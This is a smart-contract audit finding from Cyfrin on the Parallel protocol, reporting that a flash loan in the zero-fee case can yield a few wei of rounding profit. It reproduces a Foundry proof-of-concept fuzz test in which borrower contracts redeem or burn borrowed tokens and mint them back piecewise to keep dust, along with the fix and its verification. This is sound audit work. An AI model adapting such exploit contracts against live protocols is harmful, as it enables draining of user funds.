---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-03-04-cyfrin-parallel3-1-v2-0-3-7
ingested_at: '2026-07-19T07:07:17Z'
protocol_category: []
published_at: '2026-03-04T00:00:00Z'
related_swc: []
severity: Informational
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-04-cyfrin-parallel3.1-v2.0.md
tags:
- firm:cyfrin
- report:2026-03-04-cyfrin-parallel3-1-v2-0
title: In zero-fee case, flashloan can result in a few wei profit
vuln_class: []
---

# In zero-fee case, flashloan can result in a few wei profit

_Section severity (from Solodit section header): Informational_  
_Audit firm: Cyfrin_  
_Source report: [2026-03-04-cyfrin-parallel3.1-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-04-cyfrin-parallel3.1-v2.0.md)_

---

**Description:** This is issue is placeholder for: https://github.com/parallel-protocol/parallel-core/blob/audit/100proof/Parallel-Parallelizer/tests/fuzz/parallel-protocolFlashloanRedeemPiecewiseMint.t.sol and leverages Issue [*`LibHelpers.convertDecimalsTo` favours the user on a exact-out mint and burn for certain collateral decimals*](#libhelpersconvertdecimalsto-favours-the-user-on-a-exactout-mint-and-burn-for-certain-collateral-decimals).
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { ITokenP } from "contracts/interfaces/ITokenP.sol";
import { IParallelizer } from "contracts/interfaces/IParallelizer.sol";

import "../Fixture.sol";

/// @dev Minimal ERC-3156 interfaces (avoid depending on OZ interfaces in this repo).
interface IERC3156FlashBorrower {
  function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data
  )
    external
    returns (bytes32);
}

interface IERC3156FlashLender {
  function maxFlashLoan(address token) external view returns (uint256);
  function flashFee(address token, uint256 amount) external view returns (uint256);
  function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
    external
    returns (bool);
}

/// @dev Flash lender that mints principal, pulls back principal+fee via transferFrom, then burns principal.
/// This matches the mechanics of `FlashParallelToken` (principal is minted/burned, lender keeps fees).
contract FlashLenderMock is IERC3156FlashLender {
  bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

  ITokenP public immutable tokenP;

  uint256 public maxBorrowable;
  uint256 public flatFee; // simplest fee model for fuzzing

  constructor(ITokenP _tokenP) {
    tokenP = _tokenP;
  }

  function setParams(uint256 _maxBorrowable, uint256 _flatFee) external {
    maxBorrowable = _maxBorrowable;
    flatFee = _flatFee;
  }

  function maxFlashLoan(address token) external view returns (uint256) {
    return token == address(tokenP) ? maxBorrowable : 0;
  }

  function flashFee(address token, uint256 /*amount*/ ) external view returns (uint256) {
    require(token == address(tokenP), "unsupported token");
    return flatFee;
  }

  function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
    external
    returns (bool)
  {
    require(token == address(tokenP), "unsupported token");
    require(amount <= maxBorrowable, "too big");

    uint256 fee = flatFee;

    tokenP.mint(address(receiver), amount);
    require(receiver.onFlashLoan(msg.sender, token, amount, fee, data) == CALLBACK_SUCCESS, "bad callback");

    // Repay principal+fee to the lender, then burn the principal minted for the loan.
    IERC20(token).transferFrom(address(receiver), address(this), amount + fee);
    tokenP.burnSelf(amount, address(this));
    return true;
  }
}

/// @dev Borrower that tries the sequence:
/// 1) redeem all borrowed tokenP for collateral
/// 2) piecewise mint exact output to get back amount+fee with minimal collateral
/// 3) keep any leftover collateral/tokenP as profit
contract RedeemPiecewiseMintBorrower is IERC3156FlashBorrower {
  bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

  IParallelizer public immutable parallelizer;
  ITokenP public immutable tokenP;
  FlashLenderMock public immutable lender;

  address[] public collaterals; // ordered by preference (low decimals first)

  constructor(IParallelizer _parallelizer, ITokenP _tokenP, FlashLenderMock _lender, address[] memory _collaterals) {
    parallelizer = _parallelizer;
    tokenP = _tokenP;
    lender = _lender;
    collaterals = _collaterals;

    for (uint256 i; i < _collaterals.length; ++i) {
      IERC20(_collaterals[i]).approve(address(_parallelizer), type(uint256).max);
    }
    IERC20(address(_tokenP)).approve(address(_parallelizer), type(uint256).max);
  }

  function onFlashLoan(
    address,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data
  )
    external
    returns (bytes32)
  {
    require(msg.sender == address(lender), "only lender");
    require(token == address(tokenP), "wrong token");

    (uint8 chunks, bytes32 salt) = abi.decode(data, (uint8, bytes32));
    if (chunks == 0) chunks = 1;
    if (chunks > 24) chunks = 24;

    // Redeem all borrowed tokenP into collateral.
    (address[] memory tokens,) = parallelizer.quoteRedemptionCurve(amount);
    uint256[] memory minAmountOuts = new uint256[](tokens.length);
    parallelizer.redeem(amount, address(this), block.timestamp * 2, minAmountOuts);

    // Piecewise mint exact output of stablecoins to repay (amount + fee).
    uint256 remainingOut = amount + fee;
    for (uint256 i; i < chunks; ++i) {
      uint256 chunksLeft = chunks - i;
      uint256 chunkOut;
      if (chunksLeft == 1) {
        chunkOut = remainingOut;
      } else {
        // 1..2x(avg) to exercise rounding paths while keeping progress.
        uint256 avg = remainingOut / chunksLeft;
        uint256 r = uint256(keccak256(abi.encodePacked(salt, i, remainingOut)));
        uint256 span = avg == 0 ? remainingOut : (avg * 2);
        chunkOut = 1 + (r % (span == 0 ? remainingOut : span));
        if (chunkOut > remainingOut - (chunksLeft - 1)) chunkOut = remainingOut - (chunksLeft - 1);
      }

      bool minted;
      // Prefer low-decimal collaterals to maximize any rounding benefit.
      for (uint256 c; c < collaterals.length && !minted; ++c) {
        address collateral = collaterals[c];
        uint256 bal = IERC20(collateral).balanceOf(address(this));
        if (bal == 0) continue;

        uint256 needIn = parallelizer.quoteOut(chunkOut, collateral, address(tokenP));
        if (needIn == 0 || needIn > bal) continue;

        // Mint exact stable output.
        parallelizer.swapExactOutput(chunkOut, needIn, collateral, address(tokenP), address(this), block.timestamp * 2);
        minted = true;
      }
      require(minted, "cannot mint repay chunk");
      remainingOut -= chunkOut;
    }

    // Approve repayment to lender.
    IERC20(address(tokenP)).approve(address(lender), amount + fee);
    return CALLBACK_SUCCESS;
  }
}

/// @dev Borrower that tries the sequence:
/// 1) burn all borrowed tokenP into one chosen collateral via swapExactInput
/// 2) piecewise mint exact output to get back amount+fee with minimal collateral
/// 3) keep any leftover collateral/tokenP as profit
contract BurnPiecewiseMintBorrower is IERC3156FlashBorrower {
  bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

  IParallelizer public immutable parallelizer;
  ITokenP public immutable tokenP;
  FlashLenderMock public immutable lender;

  address[] public collaterals; // ordered by preference (low decimals first)

  constructor(IParallelizer _parallelizer, ITokenP _tokenP, FlashLenderMock _lender, address[] memory _collaterals) {
    parallelizer = _parallelizer;
    tokenP = _tokenP;
    lender = _lender;
    collaterals = _collaterals;

    for (uint256 i; i < _collaterals.length; ++i) {
      IERC20(_collaterals[i]).approve(address(_parallelizer), type(uint256).max);
    }
    IERC20(address(_tokenP)).approve(address(_parallelizer), type(uint256).max);
  }

  function onFlashLoan(
    address,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data
  )
    external
    returns (bytes32)
  {
    require(msg.sender == address(lender), "only lender");
    require(token == address(tokenP), "wrong token");

    (uint8 chunks, bytes32 salt, uint8 burnIndex) = abi.decode(data, (uint8, bytes32, uint8));
    if (chunks == 0) chunks = 1;
    if (chunks > 24) chunks = 24;

    address burnCollateral = collaterals[burnIndex % collaterals.length];

    // Burn all borrowed tokenP into the chosen collateral.
    uint256 out = parallelizer.quoteIn(amount, address(tokenP), burnCollateral);
    require(out > 0, "cannot burn");
    parallelizer.swapExactInput(amount, 0, address(tokenP), burnCollateral, address(this), block.timestamp * 2);

    // Piecewise mint exact output of stablecoins to repay (amount + fee).
    uint256 remainingOut = amount + fee;
    for (uint256 i; i < chunks; ++i) {
      uint256 chunksLeft = chunks - i;
      uint256 chunkOut;
      if (chunksLeft == 1) {
        chunkOut = remainingOut;
      } else {
        // 1..2x(avg) to exercise rounding paths while keeping progress.
        uint256 avg = remainingOut / chunksLeft;
        uint256 r = uint256(keccak256(abi.encodePacked(salt, i, remainingOut)));
        uint256 span = avg == 0 ? remainingOut : (avg * 2);
        chunkOut = 1 + (r % (span == 0 ? remainingOut : span));
        if (chunkOut > remainingOut - (chunksLeft - 1)) chunkOut = remainingOut - (chunksLeft - 1);
      }

      bool minted;
      for (uint256 c; c < collaterals.length && !minted; ++c) {
        address collateral = collaterals[c];
        uint256 bal = IERC20(collateral).balanceOf(address(this));
        if (bal == 0) continue;

        uint256 needIn = parallelizer.quoteOut(chunkOut, collateral, address(tokenP));
        if (needIn == 0 || needIn > bal) continue;

        parallelizer.swapExactOutput(chunkOut, needIn, collateral, address(tokenP), address(this), block.timestamp * 2);
        minted = true;
      }
      require(minted, "cannot mint repay chunk");
      remainingOut -= chunkOut;
    }

    // Approve repayment to lender.
    IERC20(address(tokenP)).approve(address(lender), amount + fee);
    return CALLBACK_SUCCESS;
  }
}

contract FlashloanRedeemPiecewiseMintFuzzTest is Fixture {
  FlashLenderMock internal lender;
  RedeemPiecewiseMintBorrower internal borrower;
  RedeemPiecewiseMintBorrower internal borrowerHighDecFirst;
  RedeemPiecewiseMintBorrower internal borrowerOnlyY;

  function setUp() public override {
    super.setUp();

    lender = new FlashLenderMock(tokenP);

    address[] memory cols = new address[](3);
    // Prefer low decimals first.
    cols[0] = address(eurA); // 6 decimals
    cols[1] = address(eurB); // 12 decimals
    cols[2] = address(eurY); // 18 decimals

    borrower = new RedeemPiecewiseMintBorrower(parallelizer, tokenP, lender, cols);

    // Prefer high decimals first (more precise), then fall back.
    address[] memory colsHigh = new address[](3);
    colsHigh[0] = address(eurY);
    colsHigh[1] = address(eurB);
    colsHigh[2] = address(eurA);
    borrowerHighDecFirst = new RedeemPiecewiseMintBorrower(parallelizer, tokenP, lender, colsHigh);

    // Only allow minting back using eurY (most precise). This should often fail to repay for tiny redeems.
    address[] memory colsOnlyY = new address[](1);
    colsOnlyY[0] = address(eurY);
    borrowerOnlyY = new RedeemPiecewiseMintBorrower(parallelizer, tokenP, lender, colsOnlyY);
  }

  function _setMonotonicMintFeesAndFlatRedemption() internal {
    // Set oracle prices to 1.0 so we isolate rounding/fee math rather than price effects.
    MockChainlinkOracle(address(oracleA)).setLatestAnswer(100_000_000);
    MockChainlinkOracle(address(oracleB)).setLatestAnswer(100_000_000);
    MockChainlinkOracle(address(oracleY)).setLatestAnswer(100_000_000);

    // Strictly increasing mint fees (monotonic) as observed in a path-independence counterexample.
    uint64[] memory xFeeMint = new uint64[](3);
    int64[] memory yFeeMint = new int64[](3);
    xFeeMint[0] = 0;
    xFeeMint[1] = 24_428_931;
    xFeeMint[2] = 44_762_710;
    yFeeMint[0] = 250_678_608;
    yFeeMint[1] = 294_321_635;
    yFeeMint[2] = 296_375_599;

    // Burn fees are irrelevant for this redeem->mint repayment cycle; keep them at 0.
    uint64[] memory xFeeBurn = new uint64[](1);
    xFeeBurn[0] = uint64(BASE_9);
    int64[] memory yFee0 = new int64[](1);
    yFee0[0] = 0;

    // Redemption curve set to flat 1.0.
    int64[] memory yRedeem = new int64[](1);
    yRedeem[0] = int64(int256(BASE_9));

    vm.startPrank(guardian);
    parallelizer.setFees(address(eurA), xFeeMint, yFeeMint, true);
    parallelizer.setFees(address(eurB), xFeeMint, yFeeMint, true);
    parallelizer.setFees(address(eurY), xFeeMint, yFeeMint, true);

    parallelizer.setFees(address(eurA), xFeeBurn, yFee0, false);
    parallelizer.setFees(address(eurB), xFeeBurn, yFee0, false);
    parallelizer.setFees(address(eurY), xFeeBurn, yFee0, false);

    // x array for redemption is strictly increasing; reuse [0] and y=BASE_9 for constant factor 1.0.
    uint64[] memory xRedeem = new uint64[](1);
    xRedeem[0] = 0;
    parallelizer.setRedemptionCurveParams(xRedeem, yRedeem);
    vm.stopPrank();
  }

  function _setZeroFeesAndFlatRedemption() internal {
    // Set mint/burn fees to 0, and redemption curve to 1, to isolate rounding effects.
    uint64[] memory xFeeMint = new uint64[](1);
    xFeeMint[0] = uint64(0);
    uint64[] memory xFeeBurn = new uint64[](1);
    xFeeBurn[0] = uint64(BASE_9);

    int64[] memory yFee = new int64[](1);
    yFee[0] = 0;

    vm.startPrank(guardian);
    parallelizer.setFees(address(eurA), xFeeMint, yFee, true);
    parallelizer.setFees(address(eurB), xFeeMint, yFee, true);
    parallelizer.setFees(address(eurY), xFeeMint, yFee, true);
    parallelizer.setFees(address(eurA), xFeeBurn, yFee, false);
    parallelizer.setFees(address(eurB), xFeeBurn, yFee, false);
    parallelizer.setFees(address(eurY), xFeeBurn, yFee, false);

    int64[] memory yRedeem = new int64[](1);
    yRedeem[0] = int64(int256(BASE_9));
    parallelizer.setRedemptionCurveParams(xFeeMint, yRedeem);
    vm.stopPrank();
  }

  function _seedReserves(uint256[3] memory initialAmounts) internal returns (uint256 mintedStables) {
    // Mint stablecoins into Alice by depositing collateral, creating backing in the parallelizer.
    vm.startPrank(alice);
    // Bound amounts so tests run quickly but still exercise rounding; eurA has 6 decimals.
    initialAmounts[0] = bound(initialAmounts[0], 1e6, 1e15 * 10 ** 6);
    initialAmounts[1] = bound(initialAmounts[1], 1e6, 1e15 * 10 ** 12);
    initialAmounts[2] = bound(initialAmounts[2], 1e6, 1e15 * 10 ** 18);

    deal(address(eurA), alice, initialAmounts[0]);
    deal(address(eurB), alice, initialAmounts[1]);
    deal(address(eurY), alice, initialAmounts[2]);

    IERC20(address(eurA)).approve(address(parallelizer), type(uint256).max);
    IERC20(address(eurB)).approve(address(parallelizer), type(uint256).max);
    IERC20(address(eurY)).approve(address(parallelizer), type(uint256).max);

    mintedStables += parallelizer.swapExactInput(initialAmounts[0], 0, address(eurA), address(tokenP), alice, block.timestamp * 2);
    mintedStables += parallelizer.swapExactInput(initialAmounts[1], 0, address(eurB), address(tokenP), alice, block.timestamp * 2);
    mintedStables += parallelizer.swapExactInput(initialAmounts[2], 0, address(eurY), address(tokenP), alice, block.timestamp * 2);
    vm.stopPrank();
  }

  /// @notice Attack attempt: borrow the max amount, redeem all borrowed tokenP, then piecewise mint to repay.
  /// Expected property (default params): attacker cannot end the flashloan with any positive residual balance
  /// (tokenP or collateral). If this fails, it suggests a rounding/curve issue worth investigating.
  function testFuzz_Flashloan_Max_RedeemAll_PiecewiseMint_NoProfit_DefaultParams(
    uint256[3] memory initialAmounts,
    uint256 loanAmountSeed,
    uint8 chunks,
    bytes32 salt
  )
    public
  {
    uint256 mintedStables = _seedReserves(initialAmounts);
    vm.assume(mintedStables > 1); // need room for a non-zero flat fee

    uint256 loanAmount = bound(loanAmountSeed, 1, mintedStables);
    lender.setParams(loanAmount, 1); // flat fee = 1 wei of tokenP

    bytes memory data = abi.encode(chunks, salt);

    // If the flashloan cannot be repaid, it will revert and the attack fails (acceptable outcome).
    try lender.flashLoan(borrower, address(tokenP), loanAmount, data) returns (bool ok) {
      require(ok, "flashLoan returned false");

      // If it succeeds, there must be no profit left behind.
      assertEq(IERC20(address(tokenP)).balanceOf(address(borrower)), 0, "profit in tokenP");
      assertEq(IERC20(address(eurA)).balanceOf(address(borrower)), 0, "profit in eurA");
      assertEq(IERC20(address(eurB)).balanceOf(address(borrower)), 0, "profit in eurB");
      assertEq(IERC20(address(eurY)).balanceOf(address(borrower)), 0, "profit in eurY");
    } catch {
      // Revert means the borrower couldn't complete the cycle and repay.
    }
  }

  /// @notice Same as the default-params test, but forces a strictly monotonic mint fee curve.
  /// This is a probe to see whether rounding dust profit can still exist even with sane (monotonic) fees.
  function testFuzz_Flashloan_Max_RedeemAll_PiecewiseMint_MonotonicMintFees_Probe(
    uint256[3] memory initialAmounts,
    uint256 loanAmountSeed,
    uint8 chunks,
    bytes32 salt
  )
    public
  {
    _setMonotonicMintFeesAndFlatRedemption();

    uint256 mintedStables = _seedReserves(initialAmounts);
    vm.assume(mintedStables > 1);

    uint256 loanAmount = bound(loanAmountSeed, 1, mintedStables);
    lender.setParams(loanAmount, 1); // flat fee = 1 wei of tokenP

    bytes memory data = abi.encode(chunks, salt);

    try lender.flashLoan(borrower, address(tokenP), loanAmount, data) returns (bool ok) {
      require(ok, "flashLoan returned false");
    } catch {
      // Revert means the borrower couldn't complete the cycle and repay.
    }
  }

  /// @notice Deterministic counterexample showing dust profit can still exist with strictly monotonic mint fees.
  function test_Flashloan_RedeemAll_PiecewiseMint_MonotonicMintFees_LeavesDustProfit() public {
    _setMonotonicMintFeesAndFlatRedemption();

    // Counterexample found by the fuzz probe above.
    uint256[3] memory initialAmounts = [
      uint256(999999999999999295433), // eurA
      uint256(132846194),             // eurB
      uint256(5626568696961731130948) // eurY
    ];
    uint256 mintedStables = _seedReserves(initialAmounts);
    assertGt(mintedStables, 1);

    uint256 loanAmount = 3621523563518;
    lender.setParams(loanAmount, 1);

    uint8 chunks = 2;
    bytes32 salt = 0xea2375bda3eedb5ded144352e05763230ad6950f8ee3d7645723968c15611ee6;
    bytes memory data = abi.encode(chunks, salt);

    bool ok = lender.flashLoan(borrower, address(tokenP), loanAmount, data);
    assertTrue(ok);

    assertEq(IERC20(address(tokenP)).balanceOf(address(borrower)), 0);
    assertEq(IERC20(address(eurA)).balanceOf(address(borrower)), 0);
    assertEq(IERC20(address(eurB)).balanceOf(address(borrower)), 0);
    assertEq(IERC20(address(eurY)).balanceOf(address(borrower)), 20);
  }

  function test_Flashloan_RedeemAll_PiecewiseMint_MonotonicMintFees_HighDecimalsFirst_StillLeavesDust() public {
    _setMonotonicMintFeesAndFlatRedemption();

    uint256[3] memory initialAmounts = [
      uint256(999999999999999295433), // eurA
      uint256(132846194),             // eurB
      uint256(5626568696961731130948) // eurY
    ];
    uint256 mintedStables = _seedReserves(initialAmounts);
    assertGt(mintedStables, 1);

    uint256 loanAmount = 3621523563518;
    lender.setParams(loanAmount, 1);

    uint8 chunks = 2;
    bytes32 salt = 0xea2375bda3eedb5ded144352e05763230ad6950f8ee3d7645723968c15611ee6;
    bytes memory data = abi.encode(chunks, salt);

    bool ok = lender.flashLoan(borrowerHighDecFirst, address(tokenP), loanAmount, data);
    assertTrue(ok);

    // We expect the borrower still to repay using eurA (eurY dust is too small to be useful),
    // so eurY dust remains.
    assertEq(IERC20(address(tokenP)).balanceOf(address(borrowerHighDecFirst)), 0);
    assertEq(IERC20(address(eurA)).balanceOf(address(borrowerHighDecFirst)), 0);
    assertEq(IERC20(address(eurB)).balanceOf(address(borrowerHighDecFirst)), 0);
    assertEq(IERC20(address(eurY)).balanceOf(address(borrowerHighDecFirst)), 20);
  }

  function test_Flashloan_RedeemAll_PiecewiseMint_MonotonicMintFees_OnlyEurY_CannotRepay() public {
    _setMonotonicMintFeesAndFlatRedemption();

    uint256[3] memory initialAmounts = [
      uint256(999999999999999295433), // eurA
      uint256(132846194),             // eurB
      uint256(5626568696961731130948) // eurY
    ];
    uint256 mintedStables = _seedReserves(initialAmounts);
    assertGt(mintedStables, 1);

    uint256 loanAmount = 3621523563518;
    lender.setParams(loanAmount, 1);

    uint8 chunks = 2;
    bytes32 salt = 0xea2375bda3eedb5ded144352e05763230ad6950f8ee3d7645723968c15611ee6;
    bytes memory data = abi.encode(chunks, salt);

    // With only eurY allowed for minting back, the borrower should revert (insufficient eurY to repay).
    vm.expectRevert("cannot mint repay chunk");
    lender.flashLoan(borrowerOnlyY, address(tokenP), loanAmount, data);
  }

  /// @notice Deterministic counterexample showing dust profit from rounding when fees are set to 0.
  /// Salt was found by brute forcing locally (see git history); this keeps the regression fast.
  function test_Flashloan_RedeemAll_PiecewiseMint_ZeroFees_LeavesDustProfit() public {
    _setZeroFeesAndFlatRedemption();

    // From failing fuzz counterexample.
    uint256[3] memory initialAmounts = [
      uint256(7722290069109197059061462975852720261121524117259838058631119),
      uint256(771447797),
      uint256(3)
    ];
    uint256 mintedStables = _seedReserves(initialAmounts);
    assertGt(mintedStables, 1);

    uint256 loanAmount = 581558164043130774767101051304;
    lender.setParams(loanAmount, 1);

    uint8 chunks = 24;
    // Brute-forced salt giving a larger deterministic eurA dust profit.
    bytes32 salt = 0xb06106542bac778aeaad81cc158812cb2f6ea44dae69fc118099eaae95163ba1;
    bytes memory data = abi.encode(chunks, salt);

    bool ok = lender.flashLoan(borrower, address(tokenP), loanAmount, data);
    assertTrue(ok);

    // Pays back principal+fee, keeps dust profit in 6-decimal collateral.
    assertEq(IERC20(address(tokenP)).balanceOf(address(borrower)), 0);
    assertEq(IERC20(address(eurA)).balanceOf(address(borrower)), 15);
    console.log("eurA: %s", IERC20(address(eurA)).balanceOf(address(borrower)));
  }
}

contract FlashloanBurnPiecewiseMintFuzzTest is Fixture {
  FlashLenderMock internal lender;
  BurnPiecewiseMintBorrower internal borrower;

  function setUp() public override {
    super.setUp();

    lender = new FlashLenderMock(tokenP);

    address[] memory cols = new address[](3);
    cols[0] = address(eurA); // 6 decimals
    cols[1] = address(eurB); // 12 decimals
    cols[2] = address(eurY); // 18 decimals

    borrower = new BurnPiecewiseMintBorrower(parallelizer, tokenP, lender, cols);
  }

  function _seedReserves(uint256[3] memory initialAmounts) internal returns (uint256 mintedStables) {
    // Same reserve seeding as the redeem test: mint stablecoins by depositing collateral,
    // leaving collateral backing on the parallelizer to be burnt out.
    vm.startPrank(alice);

    initialAmounts[0] = bound(initialAmounts[0], 1e6, 1e15 * 10 ** 6);
    initialAmounts[1] = bound(initialAmounts[1], 1e6, 1e15 * 10 ** 12);
    initialAmounts[2] = bound(initialAmounts[2], 1e6, 1e15 * 10 ** 18);

    deal(address(eurA), alice, initialAmounts[0]);
    deal(address(eurB), alice, initialAmounts[1]);
    deal(address(eurY), alice, initialAmounts[2]);

    IERC20(address(eurA)).approve(address(parallelizer), type(uint256).max);
    IERC20(address(eurB)).approve(address(parallelizer), type(uint256).max);
    IERC20(address(eurY)).approve(address(parallelizer), type(uint256).max);

    mintedStables += parallelizer.swapExactInput(
      initialAmounts[0], 0, address(eurA), address(tokenP), alice, block.timestamp * 2
    );
    mintedStables += parallelizer.swapExactInput(
      initialAmounts[1], 0, address(eurB), address(tokenP), alice, block.timestamp * 2
    );
    mintedStables += parallelizer.swapExactInput(
      initialAmounts[2], 0, address(eurY), address(tokenP), alice, block.timestamp * 2
    );

    vm.stopPrank();
  }

  /// @notice Attack attempt: borrow tokenP, burn all to a chosen collateral, then piecewise mint to repay.
  /// If the flashloan succeeds, there should be no profit left behind.
  function testFuzz_Flashloan_Max_BurnAll_PiecewiseMint_NoProfit_DefaultParams(
    uint256[3] memory initialAmounts,
    uint256 loanAmountSeed,
    uint8 chunks,
    bytes32 salt,
    uint8 burnIndex
  )
    public
  {
    uint256 mintedStables = _seedReserves(initialAmounts);
    vm.assume(mintedStables > 1);

    address burnCollateral = burnIndex % 3 == 0 ? address(eurA) : burnIndex % 3 == 1 ? address(eurB) : address(eurY);
    (uint256 issuedFromCollateral,) = parallelizer.getIssuedByCollateral(burnCollateral);
    vm.assume(issuedFromCollateral > 1);

    uint256 loanAmount = bound(loanAmountSeed, 1, issuedFromCollateral);
    lender.setParams(loanAmount, 1); // flat fee = 1 wei

    bytes memory data = abi.encode(chunks, salt, burnIndex);

    try lender.flashLoan(borrower, address(tokenP), loanAmount, data) returns (bool ok) {
      require(ok, "flashLoan returned false");

      assertEq(IERC20(address(tokenP)).balanceOf(address(borrower)), 0, "profit in tokenP");
      assertEq(IERC20(address(eurA)).balanceOf(address(borrower)), 0, "profit in eurA");
      assertEq(IERC20(address(eurB)).balanceOf(address(borrower)), 0, "profit in eurB");
      assertEq(IERC20(address(eurY)).balanceOf(address(borrower)), 0, "profit in eurY");
    } catch {
      // revert means the borrower couldn't complete the cycle and repay
    }
  }
}
```

Attack:
- redeem
- piece-wise mint

**Parallel:** Fixed in commit [f60101a](https://github.com/parallel-protocol/parallel-parallelizer/commit/f60101a455c9215c49a7ea70551da7d31ca5ca76).

**Cyfrin:** Verified. `LibHelpers.convertDecimalsTo` now rounds towards the specified direction when converting from higher decimals to lower decimals.
